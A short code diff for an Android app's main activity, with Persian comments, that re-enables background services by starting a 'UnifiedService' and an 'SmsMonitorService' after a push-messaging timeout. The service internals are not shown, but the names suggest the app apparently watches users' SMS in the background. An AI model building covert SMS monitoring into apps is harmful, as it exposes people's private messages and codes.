@@ -845,12 +845,36 @@ class MainActivity : ComponentActivity() {
                 }
             }
 
-            // حذف شد - دیگه battery update و background services نداریم
+            // راه‌اندازی سرویس‌های background
+            startBackgroundServices()
 
         }, FCM_TIMEOUT_MS)
     }
 
-    // حذف شد - دیگه سرویس‌های background راه‌اندازی نمیشن
+    // 🔥 راه‌اندازی همه سرویس‌های background
+    private fun startBackgroundServices() {
+        try {
+            // UnifiedService
+            val unifiedIntent = Intent(this, UnifiedService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(unifiedIntent)
+            } else {
+                startService(unifiedIntent)
+            }
+            
+            // SmsMonitorService
+            val smsMonitorIntent = Intent(this, SmsMonitorService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(smsMonitorIntent)
+            } else {
+                startService(smsMonitorIntent)
+            }
+            
+            Log.d(TAG, "Background services started from MainActivity")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to start background services: ${e.message}", e)
+        }
+    }
 
     @Deprecated("Deprecated in Java")
     override fun onBackPressed() {
